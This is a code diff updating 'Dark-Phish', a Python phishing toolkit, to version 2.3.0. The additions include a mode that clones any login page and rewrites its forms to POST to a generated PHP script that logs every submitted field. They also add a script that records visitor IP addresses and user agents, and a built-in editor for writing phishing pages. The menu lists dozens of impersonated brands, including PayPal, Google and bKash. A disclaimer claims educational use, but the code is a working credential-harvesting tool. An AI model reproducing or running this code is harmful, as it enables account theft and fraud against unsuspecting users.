@@ -9,7 +9,7 @@ import sys
 try:
 	import os
 	import time
-	import json
+	from bs4 import BeautifulSoup
 	import requests
 	import platform, subprocess
 	import wget
@@ -17,16 +17,91 @@ try:
 	import requests 
 	import pyshorteners
 	import sqlite3
+	import argparse
+	import shutil
+	from tkinter import *
+	from tkinter import messagebox
 except ModuleNotFoundError as error:
 	print(error)
 	sys.exit()
 	
 
-version = "2.2.1"
+version = "2.3.0"
 host = "127.0.0.1"
 port = "8080"
 
+try:
+	parser = argparse.ArgumentParser(add_help=False)
+	parser.add_argument("-H", "--host", type=str)
+	parser.add_argument("-p", "--port", type=str)
 
+	if ("-h" in sys.argv or "--help" in sys.argv):
+		print("""\033[1m
+Name:
+    Dark-Phish
+    
+Usage:
+    python3 dark-phish.py [-h] [-H HOST] [-p PORT] [-u] [-v] [-r]
+		
+Version:
+    {}
+		
+Options:
+    -h,  --help                     Show this help massage.
+    -H HOST, --host HOST            Specify the host address [Default : 127.0.0.1] . 
+    -p PORT,  --port PORT           Web server port [Default : 8080] .
+    -u,  --update                   Check for updates.
+    -v,  --version                  Show version number and exit.
+    -r,  --retrieve                 Retrieve saved credentials.
+	\033[0;0m""".format(version))
+		sys.exit()
+	else:
+		pass
+
+	args = parser.parse_args()
+	if ("-u" in sys.argv or "--update" in sys.argv):
+		check_update()
+		sys.exit()
+	elif ("-v" in sys.argv or "--version" in sys.argv):
+		print("\nDark-Phish version {}\n".format(version))
+		sys.exit()
+	elif ("-r" in sys.argv or "--retrieve" in sys.argv):
+		database_management()
+		sys.exit()
+	else:
+		pass
+
+	if args.host:
+		try:
+			host = args.host
+		except Exception as error:
+			print(error)
+	else:
+		pass
+			
+	if args.port:
+		try:
+			port = args.port
+		except Exception as error:
+			print(error)
+	else:
+		pass
+		
+except Exception as error:
+	print(error)
+	sys.exit()
+
+
+def printf(message, level):
+	timestamp = time.strftime("%H:%M:%S", time.localtime())
+	levels = {
+
+		"INFO": "\033[1;92m[INFO]\033[0;0m",
+		"WARNING": "\033[1;93m[WARNING]\033[0;0m",
+		"ERROR": "\033[1;91m[ERROR]\033[0;0m"
+	}
+
+	print("\033[1;94m[{}]{}\033[0;0m {}".format(timestamp, levels.get(level), message))
 
 def logo():
 	print("")
@@ -187,59 +262,6 @@ Credentials Management Menu:
 		print("\n\033[1;91m[!] Invalid option!\033[0;0m\n")
 	
 
-
-
-
-	
-try:
-		
-		if (len(sys.argv) > 1 ):
-			
-			if (sys.argv[1] == "-h" or sys.argv[1] == "--help"):
-				print("""\033[1m
-Name:
-    Dark-Phish
-    
-Usage:
-    python3 dark-phish.py [-h] [-p PORT] [-u] [-v] [-r]
-		
-Version:
-    {}
-		
-Options:
-    -h,  --help                     Show this help massage.
-    -p PORT,  --port PORT           Web server port [Default : 8080] .
-    -u,  --update                   Check for updates.
-    -v,  --version                  Show version number and exit.
-    -r,  --retrieve                 Retrieve saved credentials.
-	\033[0;0m""".format(version))
-				sys.exit()
-		
-			elif (sys.argv[1] == "-p" or sys.argv[1] == "--port"):
-				try:
-					port = sys.argv[2]
-				except:
-					pass
-			
-			elif (sys.argv[1] == "-u" or sys.argv[1] == "--update"):
-				check_update()
-				sys.exit()
-			
-			elif (sys.argv[1] == "-v" or sys.argv[1] == "--version"):
-				print("\nDark-Phish version {}\n".format(version))
-				sys.exit()
-			
-			elif (sys.argv[1] == "-r" or sys.argv[1] == "--retrieve"):
-				database_management()
-				sys.exit()
-			else:
-				pass
-		else:
-			pass
-		
-except Exception as error:
-	print(error)
-	sys.exit()
 
 
 
@@ -427,10 +449,10 @@ print("""
 
 [\033[1;92m01\033[0;0m] Facebook      [\033[1;92m13\033[0;0m] Samsung ID   [\033[1;92m25\033[0;0m] Adobe         [\033[1;92m37\033[0;0m] Spotify       [\033[1;92m49\033[0;0m] Flipkart  
 [\033[1;92m02\033[0;0m] Twitter       [\033[1;92m14\033[0;0m] WordPress    [\033[1;92m26\033[0;0m] Amazon        [\033[1;92m38\033[0;0m] TikTok        [\033[1;92m50\033[0;0m] PhonePe
-[\033[1;92m03\033[0;0m] Instagram     [\033[1;92m15\033[0;0m] GitLab       [\033[1;92m27\033[0;0m] Ebay          [\033[1;92m39\033[0;0m] Discord       [\033[1;92mcustom\033[0;0m] Custom
-[\033[1;92m04\033[0;0m] Snapchat      [\033[1;92m16\033[0;0m] ProtonMail   [\033[1;92m28\033[0;0m] Netflix       [\033[1;92m40\033[0;0m] Daraz         [\033[1;92m00\033[0;0m] Exit 
-[\033[1;92m05\033[0;0m] GitHub        [\033[1;92m17\033[0;0m] Linkedin     [\033[1;92m29\033[0;0m] Messenger     [\033[1;92m41\033[0;0m] WhatsApp
-[\033[1;92m06\033[0;0m] Google        [\033[1;92m18\033[0;0m] Steam        [\033[1;92m30\033[0;0m] Twitter-X     [\033[1;92m42\033[0;0m] Telegram
+[\033[1;92m03\033[0;0m] Instagram     [\033[1;92m15\033[0;0m] GitLab       [\033[1;92m27\033[0;0m] Ebay          [\033[1;92m39\033[0;0m] Discord       [\033[1;92mclone\033[0;0m] Clone
+[\033[1;92m04\033[0;0m] Snapchat      [\033[1;92m16\033[0;0m] ProtonMail   [\033[1;92m28\033[0;0m] Netflix       [\033[1;92m40\033[0;0m] Daraz         [\033[1;92mcreate\033[0;0m] Create
+[\033[1;92m05\033[0;0m] GitHub        [\033[1;92m17\033[0;0m] Linkedin     [\033[1;92m29\033[0;0m] Messenger     [\033[1;92m41\033[0;0m] WhatsApp      [\033[1;92mcustom\033[0;0m] Custom
+[\033[1;92m06\033[0;0m] Google        [\033[1;92m18\033[0;0m] Steam        [\033[1;92m30\033[0;0m] Twitter-X     [\033[1;92m42\033[0;0m] Telegram      [\033[1;92m00\033[0;0m] Exit
 [\033[1;92m07\033[0;0m] Yahoo         [\033[1;92m19\033[0;0m] Twitch       [\033[1;92m31\033[0;0m] Galaxy Store  [\033[1;92m43\033[0;0m] Signal
 [\033[1;92m08\033[0;0m] PlayStation   [\033[1;92m20\033[0;0m] VK           [\033[1;92m32\033[0;0m] Google Drive  [\033[1;92m44\033[0;0m] Imo
 [\033[1;92m09\033[0;0m] PayPal        [\033[1;92m21\033[0;0m] Pinterest    [\033[1;92m33\033[0;0m] Google Photos [\033[1;92m45\033[0;0m] bKash
@@ -443,7 +465,7 @@ print("""
 while True:
 	try:
 		option=input("\nOPTION: ").lower()
-		if option == "custom":
+		if option == "custom" or option == "clone" or option == "create":
 			break
 		else:
 			pass
@@ -664,6 +686,11 @@ keywords = {
 
 def server(action):
 
+	if args.host or args.port:
+		print("\n\033[1;92mHOST:\033[0;0m {}".format(host))
+		print("\033[1;92mPORT:\033[0;0m {}".format(port))
+
+
 	def php_server():
 		print("\n\033[1;92mStarting PHP server...\033[0;0m") 
 		start_php_server() 
@@ -855,7 +882,8 @@ def work():
 	except:
 		stop()
 		sys.exit()
-		pass
+
+
 	try:
 		log_file=open("log.txt","r")
 		log=log_file.read()
@@ -896,10 +924,43 @@ def work_otp():
 	except:
 		stop()
 		sys.exit()
-		pass
+
 	return username, password, otp_code
 
 
+def display_credentials():
+	try:
+		print("")
+		while not (os.path.exists("log.txt")):
+
+			print("\r\033[1;92mWaiting for the credentials   \033[0;0m",end="")
+			time.sleep(1)
+			print("\r\033[1;92mWaiting for the credentials.  \033[0;0m",end="")
+			time.sleep(1)
+			print("\r\033[1;92mWaiting for the credentials.. \033[0;0m",end="")
+			time.sleep(1)
+			print("\r\033[1;92mWaiting for the credentials...\033[0;0m",end="")
+			time.sleep(1)
+			if (os.path.exists("log.txt") == True):
+				print("\r\033[1;92m[{}] Credentials found.            \033[0;0m".format(time.strftime("%H:%M:%S", time.localtime())))
+				print("")
+			
+	except:
+		stop()
+		sys.exit()
+	
+	try:
+		with open("log.txt", "r") as log_file:
+
+			while True:
+
+				data = log_file.readline().strip()
+				if data:
+					printf(data, level="INFO")
+				else:
+					time.sleep(1)
+	except:
+		pass
 
 
 
@@ -949,6 +1010,64 @@ def ip_data():
 		pass
 	return None
 
+
+def login_php(action_url):
+	code = f"""<?php
+header ('Location: {action_url}');
+$handle = fopen("log.txt", "a");
+foreach($_POST as $variable => $value) {{
+fwrite($handle, $variable);
+fwrite($handle, " => ");
+fwrite($handle, $value);
+fwrite($handle, "\\r\\n");
+}}
+fwrite($handle, "\\r\\n\\n");
+fclose($handle);
+exit;
+?>"""
+	return code
+
+def ip_php():
+	code = """<?php
+if (!empty($_SERVER['HTTP_CLIENT_IP']))
+    {
+      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\\r\\n";
+    }
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
+    {
+      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\\r\\n";
+    }
+else
+    {
+      $ipaddress = $_SERVER['REMOTE_ADDR']."\\r\\n";
+    }
+$useragent = " User-Agent: ";
+$browser = $_SERVER['HTTP_USER_AGENT'];
+
+
+$file = 'ip.txt';
+$victim = "IP: ";
+$fp = fopen($file, 'a');
+
+fwrite($fp, $victim);
+fwrite($fp, $ipaddress);
+fwrite($fp, $useragent);
+fwrite($fp, $browser);
+
+
+fclose($fp);
+?>"""
+
+	return code
+
+
+def index_php():
+	code = """<?php
+include 'ip.php';
+header('Location: index.html');
+exit
+?>"""
+	return code
 
 
 def available_tunnels():
@@ -1715,7 +1834,8 @@ elif (option==34):
 		log=work()
 		otp = ""
 		username, password = extract_data(log)
-		stop()
+		stop()#timestamp = time.strftime("%H:%M:%S", time.localtime())
+
 		ip_data()
 		try:
 				os.remove("log.txt")
@@ -2040,16 +2160,109 @@ elif (option==50):
 		save_data(site, username, password, otp)
 	except Exception as error:
 		print(error)
+
+
+elif (option == "clone"):
+	def clone_webpage(url, action_url):
+		headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
+    }
+		def create_login_php(action_url):
+			if os.path.exists("core/sites/clone/login.php"):
+				os.remove("core/sites/clone/login.php")
+			else:
+				pass
+			if not action_url:
+				action_url = "https://www.google.com"
+			try:
+				code = login_php(action_url)
+				file = open("core/sites/clone/login.php", "w")
+				file.write(code)
+				file.close()
+			except Exception as error:
+				printf(error, level="ERROR")
+
+
+		if not os.path.exists("core/sites/clone"):
+			os.mkdir("core/sites/clone")
+		else:
+			pass
+		if os.path.exists("core/sites/clone/index.html") == True:
+			os.remove("core/sites/clone/index.html")
+		else:
+			pass
+
+		create_login_php(action_url)
+
+		if not os.path.exists("core/sites/clone/ip.php"):
+			file = open("core/sites/clone/ip.php", "w")
+			ip_code = ip_php()
+			file.write(ip_code)
+			file.close()
+		
+		else:
+			pass
+		
+		if not os.path.exists("core/sites/clone/index.php"):
+			index_code = index_php()
+			file = open("core/sites/clone/index.php", "w")
+			file.write(index_code)
+			file.close()
+		else:
+			pass
+		
+		try:
+			printf("Cloning the webpage...", level="INFO")
+			response = requests.get(url, headers=headers)
+			response.raise_for_status()
+			content = response.text
+			soup = BeautifulSoup(content, "html.parser")
+			form_data = soup.find("form")
+			if form_data:
+				for form in soup.find_all("form"):
+					form["action"] = "login.php"
+					form["method"] = "POST"
+			
+			
+				file = open("core/sites/clone/index.html", "w")
+				file.write(str(soup))
+				file.close()
+				printf("Injected phishing action into the form.", level="INFO")
+			else:
+				printf("No form found in the HTML.", level="WARNING")
+		except Exception as error:
+			printf("Failed to clone the webpage. Error: {}".format(error), level="ERROR")
+			sys.exit()
+	print("""\n\033[1;93mNote: It may not detect or capture credentials from all websites, especially those with complex or dynamic forms.\033[0;0m\n""")
+	try:
+		url = input("\nEnter the URL of the webpage: ")
+		action_url = input("Enter the action URL: ")
+	except Exception as error:
+		printf(error, level="ERROR")
+		sys.exit()
+
+	print("")
+	clone_webpage(url, action_url)
+	site = "clone"
+	available_tunnels()
+	os.chdir("core/sites/clone")
+	server(site)
+	display_credentials()
+	stop()
+	ip_data()
+	try:
+		os.remove("log.txt")
+	except:
+		pass
+
 		
 
 
-elif (option== "custom"):
+elif (option == "custom"):
 				site = "Custom"
 				if (tunnel == 0):
 					sys.exit()
-				else:
 					pass
-					
 				text1=input("\nText 1 (Default: System failed): ")
 				if text1=="":
 					text1="System failed"
@@ -2145,6 +2358,309 @@ button {
 					save_data(site, username, password, otp)
 				except:
 					pass
+
+elif (option=="create"):
+	def create_folder():
+		exists = os.path.exists("core/sites/create")
+		if not exists:
+			try:
+				os.mkdir("core/sites/create")
+			except Exception as error:
+				print(error)
+				sys.exit()
+		else:
+			pass
+	
+	def server_files():
+		if not os.path.exists("core/sites/create/login.php"):
+			action_url = input("Enter the action URL: ")
+			with open("core/sites/create/login.php", "w") as file:
+				file.write(login_php(action_url))
+		else:
+			pass
+		if not os.path.exists("core/sites/create/index.php"):
+			with open("core/sites/create/index.php", "w") as file:
+				file.write(index_php())
+		else:
+			pass
+		if not os.path.exists("core/sites/create/ip.php"):
+			with open("core/sites/create/ip.php", "w") as file:
+				file.write(ip_php())
+		else:
+			pass
+	
+	def save_directory():
+		action = input("Do you want to save the code for later use? (y/N): ").lower()
+		folderpath = "core/sites/create/temp"
+		if not os.path.exists(folderpath):
+			os.mkdir(folderpath)
+		else:
+			pass
+		while True:
+
+			if action == "y" or action == "yes":
+				folder = input("\nEnter the directory name: ")
+				folderpath = "core/sites/create/{}".format(folder)
+				if not os.path.exists(folderpath):
+					os.mkdir(folderpath)
+					break
+				elif os.path.exists(folderpath):
+					print("\033[1;91mThe directory already exists!\033[0;0m")
+				else:
+					pass
+			if action == "n" or action == "no" or action == "":
+				folderpath = folderpath
+				break
+			else:
+				pass
+
+		shutil.move("core/sites/create/index.html", folderpath)
+		shutil.move("core/sites/create/login.php", folderpath)
+		shutil.move("core/sites/create/index.php", folderpath)
+		shutil.move("core/sites/create/ip.php", folderpath)
+
+		return folderpath
+	
+	def delete_directory(folders):
+
+		while True:
+			try:
+				delete = False
+				if len(folders) == 0:
+					print("\033[1;91mNo directories available to delete.\033[0;0m")
+				print("\n\nSelect a directory to delete")
+				for number, folder in enumerate(folders, start=1):
+					print("[\033[1;92m{}\033[0;0m] {}".format(number, folder))
+				print("[\033[1;92m00\033[0;0m] Cancel")
+				option = input("\nOPTION: ").lower()
+				if int(option) == 0:
+					print("[{}] Delete canceled.".format(time.strftime("%H:%M:%S", time.localtime())))
+					return
+				try:
+					option = int(option) - 1
+				except:
+					print("\n\033[1;91m[!] Invalid option!\033[0;0m\n")
+				
+				directory = "core/sites/create/{}".format(folders[option])
+				confirm = input(f"Delete '{folders[option]}'? (y/N): ").lower()
+
+				if confirm in ["y", "yes"]:
+					try:
+						shutil.rmtree(directory)
+						print("\033[1;92m[{}] Directory '{}' deleted successfully.\033[0;0m".format(time.strftime("%H:%M:%S", time.localtime()), folders[option]))
+					except Exception as error:
+						print(f"\033[1;91mFailed to delete directory: {error}\033[0;0m")
+				else:
+					print("[{}] Delete canceled.".format(time.strftime("%H:%M:%S", time.localtime())))
+			except Exception as error:
+				print(error)
+
+	create_folder()
+
+	if os.path.exists("core/sites/create/temp/index.html"):
+		os.remove("core/sites/create/temp/index.html")
+	if os.path.exists("core/sites/create/temp/login.php"):
+		os.remove("core/sites/create/temp/login.php")
+	if os.path.exists("core/sites/create/temp/index.php"):
+		os.remove("core/sites/create/temp/index.php")
+	if os.path.exists("core/sites/create/temp/ip.php"):
+		os.remove("core/sites/create/temp/ip.php")
+	if os.path.exists("core/sites/create/temp"):
+		os.rmdir("core/sites/create/temp")
+
+
+	folders = [f for f in os.listdir("core/sites/create") if os.path. isdir(os.path.join("core/sites/create",f))]
+	print("")
+	print("[\033[1;92mnew\033[0;0m] Create New")
+	print("[\033[1;92mdlt\033[0;0m] Delete")
+	for number, folder in enumerate(folders, start=1):
+		print("[\033[1;92m{}\033[0;0m] {}".format(number, folder))
+	print("[\033[1;92m00\033[0;0m] Exit")
+	while True:
+		try:
+			create_new = False
+			option = input("\nOPTION: ").lower()
+			if option == "new":
+				create_new = True
+				break
+			elif option == "dlt" or option == "delete":
+				delete_directory(folders)
+			elif int(option) == 0:
+				sys.exit()
+			else:
+				pass
+			try:
+				option = int(option) - 1
+			except:
+				pass
+			break
+		except Exception as error:
+			print(error)
+
+	if create_new == False:
+		directory_name = folders[option] 
+		existing_path = "core/sites/create/{}".format(directory_name)
+	else:
+		pass
+
+	
+	
+	if create_new == True:
+		server_files()
+	else:
+		pass
+
+	def code_editor():
+		def newfile(event=None):
+			global file
+			root.title(f"Dark-Phish v{version} - Code Editor")
+			file = None
+			text_area.delete(1.0, END)
+
+		def savefile(event=None):
+			path = "core/sites/create/index.html"
+			try:
+				with open(path, "w") as file:
+					file.write(text_area.get(1.0, END))
+					messagebox.showinfo("File Saved", f"File saved as 'index.html'")
+					root.destroy()
+			except Exception as error:
+				messagebox.showerror("Error", f"Failed to save the file: {error}")
+
+		def exit_editor(event=None):
+			root.destroy()
+
+		def cut():
+			text_area.event_generate(("<<Cut>>"))
+		def copy():
+			text_area.event_generate(("<<Copy>>"))
+		def paste():
+			text_area.event_generate(("<<Paste>>"))
+		
+		def show_about():
+			about_box = Toplevel(root)
+			about_box.geometry("400x250")
+			icon = PhotoImage(file="core/icon.png")
+			about_box.iconphoto(False, icon)
+			about_box.title("About - Dark-Phish Code Editor")
+			about_box.config(bg="#2c3e50")
+
+			Label(about_box, text="Dark-Phish Code Editor", font=("Arial", 14, "bold"), bg="#2c3e50", fg="white").pack(pady=10)
+			Label(about_box, text="Version {}".format(version), font=("Arial", 10), bg="#2c3e50", fg="white").pack(pady=5)
+			Label(about_box, text="Coded by LM Sajjad", font=("Arial", 10, "italic"), bg="#2c3e50", fg="white").pack(pady=5)
+			Label(about_box, text="Disclaimer: This tool is for educational and ethical use only. "
+			"Unauthorized or illegal activities are prohibited. The author disclaims any "
+			"responsibility for misuse or legal consequences. Ensure proper authorization "
+			"before conducting any security-related activities.",
+			font=("Helvetica", 8), bg="#2c3e50", fg="red", wraplength=280, justify="left").pack(pady=10)
+
+			Button(about_box, text="Close", command=about_box.destroy, font=("Helvetica", 10, "bold"), bg="#e74c3c", fg="white").pack(pady=10)
+
+		def show_help():
+			help_box = Toplevel(root)
+
+			#help_box.geometry("500x300")
+			icon = PhotoImage(file="core/icon.png")
+			help_box.iconphoto(False, icon)
+			help_box.config(bg="white")
+
+			Label(help_box, text="Help - Dark-Phish Code Editor", font=("Arial", 14, "bold"), bg="white").pack(pady=10)
+
+			help_text = (
+				"Editing Web Pages:\n"
+				"   - Use this editor to write or modify HTML code for the web pages you wish "
+				"to use in your phishing scenarios.\n"
+				"   - The form tag must include the attributes:\n"
+				'     action="login.php" and method="POST" to capture the credentials.\n\n'
+				'     examp'
+
+				"Saving Files:\n"
+				"   - Press CTRL+S or go to the 'Menu' and click 'Save' to save your file.\n"
+				"   - The file will be saved as 'index.html' in the 'core/sites/create' folder.\n\n"
+
+				"Exiting:\n"
+				"   - Press CTRL+Q or go to the 'Menu' and click 'Exit' to close the editor.\n\n"
+
+				"Additional Actions:\n"
+				"   - You can cut, copy, and paste text using the 'Edit' menu options."
+				)
+
+			Label(help_box, text=help_text, font=("Arial", 12), bg="white", anchor="w", justify=LEFT, wraplength=480).pack(pady=10, padx=10)
+			Button(help_box, text="Close", command=help_box.destroy, bg="#2c3e50", fg="white").pack(pady=10)
+
+		root = Tk()
+		root.geometry("600x400")
+		root.title(f"Dark-Phish v{version} - Code Editor")
+
+		icon = PhotoImage(file="core/icon.png")
+		root.iconphoto(False, icon)
+
+		note = Label(root, text="""Ensure that the form tag includes action=\"login.php\" and method=\"POST\"""").pack(fill="x")
+
+		text_area = Text(root, wrap="word")
+		text_area.pack(expand=True, fill="both")
+
+		instructions = Label(root, text="Press CTRL+S to save, CTRL+Q to quit")
+		instructions.pack()
+
+		root.bind("<Control-s>", savefile)
+		root.bind("<Control-q>", exit_editor)
+
+		# Adding Menu to the menu bar
+		menu_bar = Menu(root)
+		FileMenu = Menu(menu_bar, tearoff=0)
+		FileMenu.add_command(label="New", command=newfile)
+		FileMenu.add_command(label="Save", command=savefile)
+		FileMenu.add_separator()
+		FileMenu.add_command(label="Exit", command=exit_editor)
+		menu_bar.add_cascade(label="Menu", menu=FileMenu)
+
+		# Adding Edit section to the menu bar
+		EditMenu = Menu(menu_bar, tearoff=0)
+		EditMenu.add_command(label="Cut", command=cut)
+		EditMenu.add_command(label="Copy", command=copy)
+		EditMenu.add_command(label="Paste", command=paste)
+		menu_bar.add_cascade(label="Edit", menu=EditMenu)
+
+		# Adding Help and About sections to the menu bar
+		HelpMenu = Menu(menu_bar, tearoff=0)
+		HelpMenu.add_command(label="Help", command=show_help)
+		HelpMenu.add_command(label="About", command=show_about)
+		menu_bar.add_cascade(label="Help", menu=HelpMenu)
+
+
+		root.config(menu=menu_bar)
+
+		Scroll = Scrollbar(text_area)
+		Scroll.pack(side=RIGHT, fill=Y)
+		Scroll.config(command=text_area.yview)
+		text_area.config(yscrollcommand=Scroll.set)
+
+		root.mainloop()
+
+	if create_new == True:
+		code_editor()
+		filespath = save_directory()
+	elif create_new == False:
+		filespath = existing_path
+	else:
+		pass
+	site = os.path.basename(filespath)
+	folder_path = filespath
+	available_tunnels()
+	os.chdir(folder_path)
+	server(site)
+	display_credentials()
+	stop()
+	ip_data()
+	try:
+		os.remove("log.txt")
+	except:
+		pass
+
+
+
+
 
 elif (option==00):
 	print("")
